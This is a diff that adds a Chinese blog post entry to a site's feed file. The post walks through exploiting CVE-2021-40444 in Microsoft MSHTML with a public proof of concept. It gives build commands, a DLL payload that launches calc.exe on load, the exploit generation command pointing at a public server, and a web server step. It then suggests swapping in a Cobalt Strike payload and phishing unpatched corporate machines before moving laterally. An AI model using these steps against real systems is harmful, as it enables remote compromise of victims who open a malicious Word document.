@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>【0day研究】Microsoft_MSHTML</title>
+      <link href="/posts/lsqwreoxckl/"/>
+      <url>/posts/lsqwreoxckl/</url>
+      
+        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://paper.seebug.org/1718/">https://paper.seebug.org/1718/</a></li></ul><h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><p>前一阵子的微软大洞，CVE-2021-40444，之前因为些杂七杂八的事情，错过了好时机，现在来补上。头一次研究这个方向的漏洞，过去都是渗透方面的漏洞，这个应该是属于红队方面的了，而且偏软件类，由于这方面知识储备不足，深层的漏洞原理也只是模糊了解，但不管怎么说，这个漏洞就当作初入这个领域的热身了。</p><p>Microsoft MSHTML的远程代码执行导致可以利用ActiveX进行控制</p><p>以word为例，在word内插入一个由文件创建的对象，选择链接到文件，文件名选择准备好的恶意文件的外部地址，就像挂马一样</p><p>漏洞利用mhtml协议打开远程站点的html文件，而其中包含的JS代码创建ActiveX来下载提前构筑好的cab文件，提取其中的inf文件（DLL）并以CPL执行，最终执行其中的payload。</p><p>软件调试方面的资料有上面的参考。</p><h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><p>选择用github上的poc</p><ul><li><a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></li></ul><pre><code class="shell">sudo apt-get install lcabsudo apt-get install mingw-w64</code></pre><p>安装好lcab和编译环境</p><p>制作我们自己想要的dll文件，创建.c文件将想要的payload放进去，比如想要CS上线就把就用CS的payload，我们直接用官方自带的弹计算器的payload。</p><pre><code class="c">#include &lt;windows.h&gt;void exec(void) &#123;    system(&quot;C:\\Windows\\System32\\calc.exe&quot;);    return;&#125;BOOL WINAPI DllMain(    HINSTANCE hinstDLL,    DWORD fdwReason,     LPVOID lpReserved )&#123;    switch( fdwReason )     &#123;         case DLL_PROCESS_ATTACH:           exec();            break;        case DLL_THREAD_ATTACH:            break;        case DLL_THREAD_DETACH:            break;        case DLL_PROCESS_DETACH:            break;    &#125;    return TRUE;&#125;</code></pre><p><img src="/posts/lsqwreoxckl/1.png"></p><p>然后把他编译为dll文件，并放入test目录</p><pre><code class="shell">i686-w64-mingw32-gcc -shared x.c -o x.dll</code></pre><p><img src="/posts/lsqwreoxckl/2.png"></p><p>接下来就运行exploit文件来生成携有恶意JS的html以及cab文件</p><pre><code class="shell">python3 exploit.py generate test/x.dll http://xx.xx.xx.xx #存payload的dll与公网服务器地址</code></pre><p>进入/src开启web服务</p><pre><code class="shell">python3 -m http.server 80</code></pre><p><img src="/posts/lsqwreoxckl/3.png"></p><p>再把out目录下生成的或者我们自己添加对象了的恶意word文件在windows打开就可以顺利弹一个计算器出来。如果payload放的是cs的powershell那就直接上线了，对方只要打开word就直接被拿下。</p><p>目前微软已经更新了补丁，但是这招依然可以对不少目标实施攻击，尤其是一些公司内计算机系统，大部分都是老的而且不怎么更新的，进行钓鱼攻击的话直接上线CS再进行内网渗透，扩大战果。</p><hr><center>顺带节日祝福，中秋快乐 </center>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【杂技篇】微信抢红包</title>
       <link href="/posts/qreiozlskj/"/>
       <url>/posts/qreiozlskj/</url>
